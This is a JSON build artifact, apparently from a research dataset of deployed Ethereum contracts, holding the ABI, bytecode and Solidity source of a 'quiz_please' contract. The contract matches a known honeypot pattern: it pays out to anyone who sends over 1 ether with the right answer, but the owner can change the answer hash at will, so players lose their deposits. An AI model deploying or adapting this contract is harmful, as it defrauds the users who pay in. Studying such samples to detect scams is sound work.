{
  "contractName": "quiz_please",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "start_qz_game",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "newQuestioner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106c7806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063379dadfe1461006f5780633853682c146101115780633e3ee8591461013f5780633fad9ae0146101a957806359988dce14610239575b005b61010f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061027c565b005b61013d600480360381019080803590602001908201803590602001919091929391929390505050610358565b005b6101a7600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190505050610436565b005b3480156101b557600080fd5b506101be6104b8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101fe5780820151818401526020810190506101e3565b50505050905090810190601f16801561022b5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561024557600080fd5b5061027a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610556565b005b600060010260025460001916141561035457806040518082805190602001908083835b6020831015156102c4578051825260208201915060208101905060208303925061029f565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206002816000191690555081600090805190602001906103119291906105f6565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561039257600080fd5b818160405180838380828437820191505092505050604051809103902060001916600254600019161480156103ce5750670de0b6b3a764000034115b15610432573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610430573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561049257600080fd5b81600090805190602001906104a89291906105f6565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561054e5780601f106105235761010080835404028352916020019161054e565b820191906000526020600020905b81548152906001019060200180831161053157829003601f168201915b505050505081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156105b257600080fd5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061063757805160ff1916838001178555610665565b82800160010185558215610665579182015b82811115610664578251825591602001919060010190610649565b5b5090506106729190610676565b5090565b61069891905b8082111561069457600081600090555060010161067c565b5090565b905600a165627a7a723058201f546b154439224f5d2a04ac1ebf4a0fcb7cded8987f27c947f27b80a65732a30029",
  "source": "\n\ncontract quiz_please\n{\n    function Try(string _response) external payable {\n        require(msg.sender == tx.origin);\n        \n        if(responseHash == keccak256(_response) && msg.value>1 ether)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    string public question;\n    \n    address questionSender;\n    \n    bytes32 responseHash;\n \n    function start_qz_game(string _question,string _response) public payable {\n        if(responseHash==0x0) \n        {\n            responseHash = keccak256(_response);\n            question = _question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {\n        question = _question;\n        responseHash = _responseHash;\n    }\n    \n    function newQuestioner(address newAddress) public onlyQuestionSender {\n        questionSender = newAddress;\n    }\n    \n    modifier onlyQuestionSender(){\n        require(msg.sender==questionSender);\n        _;\n    }\n\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x77e00640a6343152a35542027ba76407bdde0bb6/contracts/0x77e00640a6343152a35542027ba76407bdde0bb6.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:58:03.092Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}